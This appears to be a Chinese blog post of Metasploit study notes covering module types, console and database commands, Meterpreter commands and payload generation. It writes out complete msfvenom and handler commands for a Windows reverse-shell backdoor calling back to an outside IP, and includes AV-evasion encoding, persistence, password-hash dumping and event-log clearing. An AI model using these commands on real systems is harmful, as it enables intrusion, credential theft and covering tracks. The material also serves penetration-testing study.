
# [Metasploit 基操](https://www.raingray.com/archives/2160.html)

## 目录

-   [目录](#%E7%9B%AE%E5%BD%95)
-   [SearchSploit](#SearchSploit)
-   [MSF](#MSF)
    -   [基操](#%E5%9F%BA%E6%93%8D)
    -   [MSF 数据库操作](#MSF+%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C)
    -   [生成 Payload 反弹 Shell](#%E7%94%9F%E6%88%90+Payload+%E5%8F%8D%E5%BC%B9+Shell)
    -   [Meterpreter](#Meterpreter)
        -   [常用命令](#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4)
            -   [文件](#%E6%96%87%E4%BB%B6)
            -   [执行](#%E6%89%A7%E8%A1%8C)
            -   [提权](#%E6%8F%90%E6%9D%83)
            -   [网络](#%E7%BD%91%E7%BB%9C)
    -   [auxiliary 信息收集 (未完成)](#auxiliary+%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%28%E6%9C%AA%E5%AE%8C%E6%88%90%29)
    -   [msfvenom](#msfvenom)
-   [参考文章](#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0)

## SearchSploit

searchsploit 和 [exploit](https://www.exploit-db.com/) 内容一致，用来快速获取漏洞信息。

## MSF

msf 主目录 `/usr/share/metasploit-framework/modules`。

下面介绍这几种模块

```plaintext
auxiliary 
encoders
evasion
exploits
nops
payloads
post
```

exploits  
是利用漏洞的一个动作，通过这个动作成功利用漏洞进入系统，利用漏洞的代码称作利用代码。而最后在目标系统上执行的代码叫 Payload，这个 Payload 可以是一句反弹 Shell 的代码，也可以是用 echo 程序输出一句话，前者称作 shellcode（以能拿到 shell 得名），后者则是系统命令。MSf 中 Payload 分类，Payload 目录 `/usr/share/metasploit-framework/modules/payloads`。

singles  
不需要依赖库，所有功能都已经写到代码里了，但需要内存比较大。

stagers  
在目标内存有限时，可以先传较小的 Payload 过去。

stages  
接着中 stagers 建立的网络连接去下载另外一个功能更强的 Payload，这 stagers 和 stages 有点像传完小马传大马。  
auxiliary 是辅助模块，不提供利用和 Payload 功能，仅仅做信息收集和枚举扫描等功能。其中 DOS 检测会发送一些字符导致目标系统内存溢出或者软件流程终端，也就是服务停止，这个不是 Payload。

encoders  
对 Payload 进行编码，以此来躲避 AV (Anti Virus) 的查杀。

nops  
提高 Payload 稳定性以及维持 payload 原本大小。

### 基操

查找某条命令的帮助

```plaintext
-------------具体命令的使用方法---------------
help command
command -h

----------打印所有命令的使用方法-------------
help
```

启动不显示 banner 字符画。

```plaintext
┌──(root㉿raingray)-[~]
└─# msfconsole -q
msf6 >
```

类似 nc 的功能

```plaintext
connect
```

在 msf 主界面显示模块。

```plaintext
show module_name
```

keyword 根据关键词搜索，type 设置搜索类型比如 exploit 或 auxiliary，edb。根据 Payload Rank 来判断使用那个效果比较好，Excellent 完美利用，不会导致服务器宕机，Great 具有 check 目标有没漏洞的功能，Good 限定目标通常只有某个版本能够用，Normal 这个模块没有 check 功能，Average 利用条件苛刻 Payload 不稳定，Low 漏洞利用成功率不高 50% 左右。

```plaintext
search keyword | type | edb
```

切换到指定模块目录下。指定模块名称或者通过 search 搜索出来直接写 ModulesId 也可以设置，避免写一长串名称。

```plaintext
use module_path
```

options 目标要配置的一些选项，target 是模块适用于那些平台，missing 是这个模块必须要填的参数这样才能运行起来，evasion 是对 Payload 加密混淆用的，payload 是适用当前模块下的 Payload。

```plaintext
show  optioins | target | missing | evasion | payloads
```

对选项的值进行设定。运行 `unset options` 恢复默认值。

```plaintext
set options value
```

设置全局变量，这样在所有模块中此 options 的值就会被设置 (使用 `unsetg options` 可恢复初始值)，退出 msf 不会保存设置的值，如果想保存，设置完后用 `save` 保存配置。

```plaintext
setg options value
```

开始启动模块，用 exploit 也行，它俩一样，`-j` 选项是将运行结果放入后台，可以用`sessions`查看所有 session。

```plaintext
run -j
```

session -i 输入 session id 后就能进行 shell 界面，-l 是显示所有已经成功的 session，进去之后想暂时离开当前 session 会话可以用 `background`，离开不是断开所以会话依旧存在，也可以用 `bg` 它俩作用相同。[文章](https://www.bodkin.ren/index.php/archives/458/)

```plaintext
session -i id [-l]
```

kill 掉这个 session Id，也可填一个范围值。

```plaintext
session -k [id | id-id]
```

查看当前模块信息

```plaintext
info
```

直接编辑当前模块，默认使用 vim 打开。

```plaintext
edit
```

检测目标是否存在漏洞，但很多利用模块没有这个功能。

```plaintext
check
```

回到 msf 主界面

```plaintext
back
```

可以用来加载外部扫描器插件来扫描漏洞，当然也可以加载其他插件，加载后可以用 `unload name` 卸载。

```plaintext
msf6 > load
load aggregator        load lab               load session_notifier
load alias             load libnotify         load session_tagger
load auto_add_route    load msfd              load socket_logger
load beholder          load msgrpc            load sounds
load besecure          load nessus            load sqlmap
load capture           load nexpose           load thread
load db_credcollect    load openvas           load token_adduser
load db_tracker        load pcap_log          load token_hunter
load event_tester      load request           load wiki
load ffautoregen       load rssfeed           load wmap
load ips_filter        load sample
```

可以加载自己编写的模块进行使用。

```plaintext
loadpath
```

让去向 192.168.0.0 网络的流量全部走 session id 号为 1 的这个 session，一般用来横向渗透内网其他主机时会用到。

```plaintext
route add 192.168.0.0/24 1
```

是一个开发接口 (直接进入 ruby 解释器)，可以开发一些自己的模块，使用的是 ruby 语言。

```plaintext
irb
```

可以让 msf 执行 filename.rc 资源文件内的指令，而不用每次都手敲，当你不在 msf 终端界面时也可以用 `msfconsole -r filename.rc` 执行。你需要注意它的默认路径是在 msf 模块目录下面，路径是 `/usr/share/metasploit-framework/modules`。

```plaintext
resource filename.rc
```

用来查看那些模块正在工作。

```plaintext
jobs
```

杀死正在工作的作业。

```plaintext
kill
```

`searchsploit` 和 MSF 模块一致，可以从里面搜利用，找到 MSF 可利用的模块，在 MSF 里 use 一键操作。

### MSF 数据库操作

数据库没启动有什么影响呢？在用 MSF 收集目标信息的时候收集结果会存在数据库中，没启动就很麻烦，其他模块就不能调用已经扫描的信息。msf 是用 postgresql 作为后端数据库的，端口为 5432，没启动可以用 `systemctl start postgresql` 启动数据库。

当数据库出现问题时可以用 `msfdb reinit` 重新初始化数据库，更多信息查看帮助文档。

查看数据库是否连接。

```plaintext
db_status
```

将所有模块路径写到数据库里，在用 search 速度就很快。

```plaintext
db_rebuild_cache
```

这个功能和 nmap 无异，参数也一致，只是使用 db\_nmap 会把扫描结果放入数据库中，结果可以用 hosts 在 msf 中查看。

```plaintext
db_nmap
```

加了地址就只显示这个地址的信息，-u 只显示 up 状态的主机，-c 只显示列信息比如-c address,mac 就只显示 ip 地址和 mac 信息，-S 是搜索结果中的关键词。

```plaintext
hosts [-u] [-c col1,col2] [-S] [ipadd]
```

可以显示 db\_nmap 扫描结果中 host 开放了那些端口，-p 1-1000 就只显示这个范围内开放的端口，和 hosts 使用方法类似，更多信息使用 -h 查看帮助文档。

```plaintext
services [-p port_num]
```

查看爆破出的密码信息。

```plaintext
creds
```

查看漏洞信息。

```plaintext
vulns
```

查看密码 hash 值。

```plaintext
loot
```

导入数据库，可以将 nmap 扫描结果的 xml 文件导入 msf 数据库中，导入后用 hosts 查看详细信息。

```plaintext
db_export
```

将 msf 数据库导出，-f 指定格式。

```plaintext
db_import -f xml path
```

### 生成 Payload 反弹 Shell

\-f 指定输出类型  
\-b 重新编码坏字符，坏字符会导致 ShellCode 执行失败  
\-e 指定编码器如果不填这个选项 msf 会自动选择最佳编码器，-i 5 编码 5 次  
\-s 14 会在 payload 前面加上 14 字节的 NOP(Next Operaction)，这个 NOP 是指无操作，EIP 寄存器遇到这个指令就会往下找下个字节一直到可以运行的字节，这样可能到达免杀效果 (在练习中无法使用这个选项，不知道怎么回事)  
\-k 在程序运行中不会产生新进程只会在进程中多出一个线程，也就是说运行 1.exe 不会产生一个 2.exe 出来  
\-x 使用 /root/mstsc.exe 作为模板  
\-o 将 payload 和模板绑在一起输出成 mm.exe 文件。

```plaintext
generate -f exe -b '\x00\xff' -i 10 -k -x /root/mstsc.exe -o /root/mm.exe
```

使用 msfvenom 工具生成 Payload，下面生成示例只是为了展示所有存在选项。

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp -a x86_64 --platform windows LHOST=45.32.1.1 LPORT=6000 -e x64/xor_dynamic -i 15 -b PrependMigrate=true PrependMigrateProc=svchost.exe -x ./mongo.exe -k -f exe -o ./1.exe
```

-   `-p windows/meterpreter/reverse_tcp`，是选择的 Payload。
-   `-a x86_64`，目标系统架构，比如是什么语言写的应用系统呀，选对的位数避免兼容问题，不然可能无法上线。
-   `--platform windows`，目标系统平台架构，确保兼容，比如：Windows 还是 Linux 或者是 Android。
-   `LHOST=45.32.*.* LPORT=6000`，指定要反弹 Shell 到哪台机器上 6000 端口。
-   `-e x64/xor_dynamic -i 15`，选择 shikata\_ganai 编码器将 payload 编码 15 次。并没什么用处，无法过杀软。
-   `-b，用于去除 %ff %00` 这种坏字符，而且会自动选择编码器
-   `PrependMigrate=true`，当这个进程被杀了之后，我要迁移进程。
-   `PrependMigrateProc=svchost.exe`，将进程迁移到 svchost.exe，迁移到 explorer.exe 也是个不错的选择
-   `-x ./mongo.exe`，使用 mongo.exe 来作为模板，它的功能还在只不过将 payload 也加进去了。没咋用过此选项。
-   `-k`，在程序运行中不会产生新进程只会在进程中多出一个线程，也就是说运行 1.exe 不会产生一个 2.exe 出来
-   `-f exe`，是文件输出格式，比如：python 脚本或是 c 的源代码也可是 exe 可以执行程序等等...
-   `-o`，将 Payload 保存在哪里。

另一种是在 Console 种生成

1.  msfconsole
2.  msf > use payload/windows/x64/meterpreter/reverse\_tcp
3.  set lhost 192.168.1.118
4.  generate

监听端口等待后门反连。

```plaintext
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 45.32.1.1
msf exploit(handler) > set lport 6000
msf exploit(handler) > exploit
```

用 MSF 生成 exe 文件来反弹 Shell，如果 Windows Shell 界面乱码可以临时设置终端编码为 UTF-8。

```plaintext
chcp 65001
```

### Meterpreter

这种 Shell 是运行在内存中的，比如说把自身当做线程写入到某一个进程中，不写入硬盘。接着建立 socket 链接，通过链接上传并加载 DLL 到进程中，此时就开放了某些 API，通过 Socket 链接建立 TLS 通信隧道，以此向客户端发送一些命令，这些命令由这个 API 去执行。

在 `set payload` 时指定 Meterpreter 分类下的各种 payload。

shellcode 执行成功返回 meterpreter Shell 后，也可以使用 help 来获得帮助信息。

```plaintext
meterpreter > help
```

#### 常用命令

##### 文件

对目标文件系统进行操作。

| Command | Description |
| --- | --- |
| cd  | 切换目录，在命令前面加个 l 就是在本地操作。 |
| cp  | 复制 x 到哪里去。 |
| ls  <br>dir | 显示当前目录下的文件，dir 命令作用与它一致。在命令前面加个 l 就是在本地操作。 |
| pwd  <br>getwd | 显示目标系统当前工作目录，getwd 与 pwd 作用相同。在命令前面加个 l 就是在本地操作。 |
| edit | 在目标系统当前活动目录中编辑或创建文件，和 vi 一样操作。 |
| cat | 读取一个文件内容并显示在屏幕上。 |
| mkdir | 在目标文件系统上创建一个目录。 |
| mv  | 移动目标文件系统中的内容到指定位置。 |
| rm  | 删除指定文件。 |
| rmdir | 删除目标文件系统中指定文件夹。 |
| show\_mount | 显示你挂载了哪些设备或分区。 |
| search | 搜索目标文件系统中文件。 |
| download | 把目标系统内容下载到本机。 |
| upload | 上传一个内容到目标文件系统。如 upload srouceFile C:/Windows/ |

##### 执行

执行命令。

| Command | Description |
| --- | --- |
| run(bgrun) | 执行 meterpreter 脚本或 POST 模块命令，bgrun 是在 background 运行。 |
| clearev | 清空所有日志。Linux 下未测试，设想有日志实时同步如何破局。 |
| excute | 在目标系统上执行命令。 |
| hashdump | 获取 SAM 数据库中的 hash，使用 run post/windows/gather/hashdump 也可获得 hash。 |
| getuid | 获取当前运行账户。 |
| sysinfo | 获取系统信息。 |
| ps  | 查看当前运行的进程。 |
| kill | 杀死进程。 |
| getpid | 查看 meterpreter 注入到正常进程的 id 号。 |
| migrate | 将 meterpreter 迁移到另外一个正常进程中，比如 Windows 的 explorer。 |
| reboot | 重启。 |
| shutdown | 关机。 |
| shell | 获得当前用户的 shell。 |
| idletime | 目标机器多久没有被操作了，方便在管理员不在的时候进行测试。 |
| resource | 从本地一个文件中执行里面儿的命令，比如放一大堆信息收集的命令一键执行。 |
| screenshare | 获取目标桌面活动状态。 |

##### 提权

权限提升。

| Command | Description |
| --- | --- |
| getsystem | 将当前用户提升到 SYSTEM |

##### 网络

网络相关命令。

| Command | Description |
| --- | --- |
| arp | 显示 ARP 缓存 |
| getproxy | 显示浏览器代理配置 |
| ifconfig(ipconfig) | 显示网卡信息 |
| netstat | 显示网络连接信息 |
| route | 显示或更改对方系统上的路由表 |

无需 Python 解释器在对方系统执行 Python 代码

先加载 Python 扩展。

```plaintext
meterpreter > load python 
```

通过下面命令执行语句。

```plaintext
python_execute print(1)   #执行 Python 语句
python_import -f path/filename.py   #导入模块并执行
python_reset #重新加载 Python 解释器
```

调用相关脚本获取信息 [https://www.offensive-security.com/metasploit-unleashed/existing-scripts/](https://www.offensive-security.com/metasploit-unleashed/existing-scripts/)

一些测试过的选项

-   ~run persistence -XU -P windows/x64/meterpreter/reverse\_tcp -i 5 -p 8084 -r 106.2.120.110，持久化 -U 用户登录时自动启动代理 -X 系统启动时自动启动代理 -P 指定运行的 Payload -p 端口 -r 主机 -i 每 5 秒重连一次。~官方已经废弃此模块替换为 `exploit/windows/local/persistence`
-   screenshare -d 0.0.1 -q 70，按帧对屏幕截图，获取 VNC 失败只能采用一帧一帧截图的方式上传图片。客户端操作太快会有延迟。
-   run screen\_unlock，屏幕解锁。Windows 10 不好使。
-   clearev，清除日志。在目标是 Windows 10 测试失败
-   run hashdump，导出用户密码 hash
-   reboot，重启目标机器

### auxiliary 信息收集 (未完成)

auxiliary 模块下要用那种模块，直接用 info 查看基本信息就知道是干嘛用的。

### msfvenom

用来生成 Payload

armitage 是 metasploit 的一个组件，工作界面为 GUI，功能与 msf 一致。

migrate 隐藏远程链接 shell

将网上的 POC 复制到 `/usr/share/metasploit-framework/modules/` 使用

制作木马，拿到 Shell。

## 参考文章

-   [Metasploit Documentation](https://docs.metasploit.com/)
-   [【译】Metasploit：如何使用 msfvenom](https://xz.aliyun.com/t/2381)
-   [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
-   [Hiding Shell using PrependMigrate -Metasploit](https://www.hackingarticles.in/hiding-shell-prepend-migrate-using-msfvenom/)
-   [Msfvenom Tutorials for Beginners](https://www.hackingarticles.in/msfvenom-tutorials-beginners/)
-   [METASPLOIT UNLEASHED – FREE ETHICAL HACKING COURSE](https://www.offensive-security.com/metasploit-unleashed/)

最近更新：2023 年 04 月 24 日 15:52:14

发布时间：2020 年 01 月 20 日 01:20:00
